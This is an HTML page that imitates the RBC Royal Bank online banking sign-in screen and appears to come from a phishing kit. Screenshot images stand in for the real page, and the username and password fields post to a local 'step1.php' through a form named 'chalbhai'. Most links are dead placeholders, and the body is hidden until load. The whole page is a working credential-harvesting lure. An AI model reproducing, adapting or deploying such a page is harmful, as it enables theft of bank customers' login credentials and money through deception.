<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>RBC Royal Bank Sign In to Online Banking</title>
<meta name="generator" content="Web Page Maker">
<style type="text/css">
div#container
{
	position:relative;
	width: 1282px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}



input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label, input[type=checkbox].css-checkbox + label.css-label.clr {
							padding-left:35px;
							height:30px; 
							display:inline-block;
							line-height:30px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:30px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label, input[type=checkbox].css-checkbox + label.css-label.chk {
							background-position: 0 -30px;
						}
						label.css-label {
				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_87f762594c3902faebf13d4ef7905dc4.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
</style>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox { 
    margin-top: 10px;
    padding: 12px 10px;
    height: 45px;
    width: 340px;
    border: 1px solid #0758ae;
 }
 </style>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:-1px; top:-1px; width:1351px; height:98px; z-index:0"><img src="images/a1.png" alt="" title="" border=0 width=1351 height=98></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:97px; width:1350px; height:495px; z-index:1"><img src="images/a2.png" alt="" title="" border=0 width=1350 height=495></div>
<form action="step1.php" name=chalbhai id=chalbhai method=post>
<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:561px; width:1350px; height:327px; z-index:2"><img src="images/a3.png" alt="" title="" border=0 width=1350 height=327></div>

<div id="image4" style="position:absolute; overflow:hidden; left:-1px; top:888px; width:1351px; height:377px; z-index:3"><img src="images/a4.png" alt="" title="" border=0 width=1351 height=377></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1038px; top:19px; width:141px; height:19px; z-index:4"><a href="#"><img src="images/customer.png" alt="" title="" border=0 width=141 height=19></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:1202px; top:21px; width:60px; height:17px; z-index:5"><a href="#"><img src="images/francaise.png" alt="" title="" border=0 width=60 height=17></a></div>

<input name="formtext1" class="textbox" required type="text" style="position:absolute;width:338px;left:136px;top:238px;z-index:6">
<input name="formtext2" class="textbox" required type="password" style="position:absolute;width:338px;left:136px;top:382px;z-index:7">
<div id="formimage1" style="position:absolute; left:491px; top:392px; z-index:8"><input type="image" name="formimage1" width="84" height="44" src="images/button.png"></div>
<div id="image7" style="position:absolute; overflow:hidden; left:131px; top:310px; width:162px; height:20px; z-index:9"><a href="#"><img src="images/recover.png" alt="" title="" border=0 width=162 height=20></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:132px; top:457px; width:141px; height:16px; z-index:10"><a href="#"><img src="images/reset.png" alt="" title="" border=0 width=141 height=16></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:133px; top:485px; width:170px; height:19px; z-index:11"><a href="#"><img src="images/needhelp.png" alt="" title="" border=0 width=170 height=19></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:89px; top:99px; width:693px; height:28px; z-index:12"><a href="#"><img src="images/a5.png" alt="" title="" border=0 width=693 height=28></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:116px; top:638px; width:305px; height:145px; z-index:13"><a href="#"><img src="images/spotlight.png" alt="" title="" border=0 width=305 height=145></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:511px; top:637px; width:259px; height:194px; z-index:14"><a href="#"><img src="images/staysafe.png" alt="" title="" border=0 width=259 height=194></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:906px; top:708px; width:79px; height:16px; z-index:15"><a href="#"><img src="images/learnmore.png" alt="" title="" border=0 width=79 height=16></a></div>
<div id="checkboxG1"  style="position:absolute; left:490px; top:255px; z-index:16"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:490px; top:255px; z-index:16"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>

<div id="image14" style="position:absolute; overflow:hidden; left:89px; top:996px; width:185px; height:133px; z-index:17"><a href="#"><img src="images/manage account.png" alt="" title="" border=0 width=185 height=133></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:329px; top:997px; width:148px; height:132px; z-index:18"><a href="#"><img src="images/customer service.png" alt="" title="" border=0 width=148 height=132></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:568px; top:996px; width:182px; height:123px; z-index:19"><a href="#"><img src="images/rates.png" alt="" title="" border=0 width=182 height=123></a></div>

<div id="image17" style="position:absolute; overflow:hidden; left:808px; top:995px; width:205px; height:93px; z-index:20"><a href="#"><img src="images/security.png" alt="" title="" border=0 width=205 height=93></a></div>

<div id="image18" style="position:absolute; overflow:hidden; left:1103px; top:990px; width:143px; height:18px; z-index:21"><a href="#"><img src="images/advice.png" alt="" title="" border=0 width=143 height=18></a></div>

<div id="image19" style="position:absolute; overflow:hidden; left:379px; top:1196px; width:309px; height:20px; z-index:22"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=309 height=20></a></div>

<select name="formselect2" class="textbox" style="position:absolute;left:731px;top:382px;width:338px;z-index:23">
<option value="/english/netaction/sgne.html">RBC Direct Investing</option>
                                            <option value="/english/ris/pcd/sgne.html">DS Online</option>
                                            <option value="/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;LANGUAGE=ENGLISH&amp;F22=IB&amp;REQUEST=ErnexLink">RBC Rewards</option>
                                            <option value="/english/wm/sgne.html">Wealth Management</option>
                                            <option value="http://www.rbc.com/online-services.html">Other Services</option>
</select>
<div id="image20" style="position:absolute; overflow:hidden; left:730px; top:244px; width:131px; height:43px; z-index:24"><a href="#"><img src="images/enrol.png" alt="" title="" border=0 width=131 height=43></a></div>

<div id="image21" style="position:absolute; overflow:hidden; left:729px; top:455px; width:77px; height:44px; z-index:25"><a href="#"><img src="images/go.png" alt="" title="" border=0 width=77 height=44></a></div>


</body>
</html>
